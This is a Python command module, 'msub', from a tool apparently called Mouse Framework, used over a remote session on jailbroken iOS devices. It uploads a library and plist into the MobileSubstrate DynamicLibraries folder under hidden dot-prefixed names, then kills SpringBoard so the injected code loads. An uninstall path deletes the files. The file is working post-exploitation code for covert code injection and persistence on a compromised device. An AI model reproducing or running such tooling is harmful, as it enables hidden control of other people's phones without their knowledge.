#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import re, os, time

class command:
    def __init__(self):
        self.name = "msub"
        self.description = "Mouse Substrate."
        self.usage = "Usage: msub [install|uninstall]"
    
    def run(self,session,cmd_data):
        if not cmd_data['args'] or not cmd_data['args'] in ['install','uninstall']:
            print(self.usage)
            return
        if cmd_data['args'] == "install":
            h.info_general("Uploading msub.dylib (1/2)...")
            session.upload_file("substrate/msub.dylib","/Library/MobileSubstrate/DynamicLibraries",".msub.dylib")
            time.sleep(0.5)
            h.info_general("Uploading msub.plist (2/2)...")
            session.upload_file("substrate/msub.plist","/Library/MobileSubstrate/DynamicLibraries",".msub.plist")
            time.sleep(0.5)
            h.info_general("Restarting SpringBoard...")
            time.sleep(1)
            session.send_command({"cmd":"killall","args":"SpringBoard"})
        if cmd_data['args'] == "uninstall":
            h.info_general("Removing msub.dylib (1/2)...")
            session.send_command({"cmd":"rm","args":"/Library/MobileSubstrate/DynamicLibraries/.msub.dylib"})
            time.sleep(0.3)
            h.info_general("Removing msub.plist (2/2)...")
            session.send_command({"cmd":"rm","args":"/Library/MobileSubstrate/DynamicLibraries/.msub.plist"})
            time.sleep(0.3)
            h.info_general("Restarting SpringBoard...")
            time.sleep(1)
            session.send_command({"cmd":"killall","args":"SpringBoard"})
